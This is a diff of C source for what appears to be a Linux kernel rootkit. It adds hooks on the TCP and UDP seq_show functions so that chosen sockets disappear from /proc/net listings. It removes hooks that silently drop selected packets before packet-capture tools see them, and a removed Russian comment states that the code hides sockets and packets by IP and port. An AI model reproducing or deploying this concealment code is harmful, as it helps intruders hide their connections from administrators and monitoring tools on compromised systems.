@@ -1,55 +1,50 @@
+#include "net.h"
+// -------------------- filter from /proc/net/* -------------------------
+
+asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    long res = real_tcp4_seq_show(seq, v);
+
+    if (is_skip4_seq_show(v, tcp)) {
+        return SEQ_SKIP;
+    }
+
+    return res;
+}
+
+asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v)
+{
+    long res = real_udp4_seq_show(seq, v);
+
+    if (is_skip4_seq_show(v, udp)) {
+        return SEQ_SKIP;
+    }
+
+    return res;
+}
+
+asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    long res = real_tcp6_seq_show(seq, v);
+
+    if (is_skip6_seq_show(v, tcp)) {
+        return SEQ_SKIP;
+    }
+    return res;
+}
+
+asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v)
+{
+    long res = real_udp6_seq_show(seq, v);
+
+    if (is_skip6_seq_show(v, udp)) {
+        return SEQ_SKIP;
+    }
+
+    return res;
+}
+
 // #include <asm-generic/access_ok.h>
-
-/*
-    Скрывает:
-    - сокеты по ip и port
-    - tcp udp пакеты по ip и port
-*/
-
-/*
-    Находятся в src/hide/filter_functions.c
-    
-    bool is_hide_packet(struct sk_buff *skb);    
-    bool is_skip4_seq_show (void *v, enum Protocols protocol);
-    bool is_skip6_seq_show (void *v, enum Protocols protocol);
-*/
-
-extern int debug_lvl;
-
-static int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
-    if (is_hide_packet(skb)) {
-        consume_skb(skb); 
-        return 1;  
-    }
-
-    int ret = real_packet_rcv(skb, dev, pt, orig_dev);
-    udelay(200);
-    return ret;
-}
-
-static int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
-    if (is_hide_packet(skb)) {
-        consume_skb(skb); 
-        return 1;  
-    }
-
-    int ret = real_packet_rcv_spkt(skb, dev, pt, orig_dev);
-    udelay(200);
-    return ret;
-}
-
-static int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
-    if (is_hide_packet(skb)) {
-        consume_skb(skb);
-        return 1;  
-    }
-
-    int ret = real_tpacket_rcv(skb, dev, pt, orig_dev);
-    udelay(200);
-    return ret;
-}
-
-
 
 // static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs) {
 //     long ret = real_sys_recvmsg(regs);
@@ -158,53 +153,3 @@ static int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct pa
 
 //     return ret;
 // }
-
-
-
-// -------------------- filter from /proc/net/* -------------------------
-// ===================== Перехват функций ===============================
-
-static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v)
-{
-    long res = real_tcp4_seq_show(seq, v);
-
-    if (is_skip4_seq_show(v, tcp)) {
-        return SEQ_SKIP;
-    }
-
-    return res;
-}
-
-static asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v)
-{
-    long res = real_udp4_seq_show(seq, v);
-
-    if (is_skip4_seq_show(v, udp)) {
-        return SEQ_SKIP;
-    }
-
-    return res;
-}
-
-static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v)
-{
-    long res = real_tcp6_seq_show(seq, v);
-
-    if (is_skip6_seq_show(v, tcp)) {
-        return SEQ_SKIP;
-    }
-    return res;
-}
-
-static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v)
-{
-    long res = real_udp6_seq_show(seq, v);
-
-    if (is_skip6_seq_show(v, udp)) {
-        return SEQ_SKIP;
-    }
-
-    return res;
-}
-
-// ======================================================================
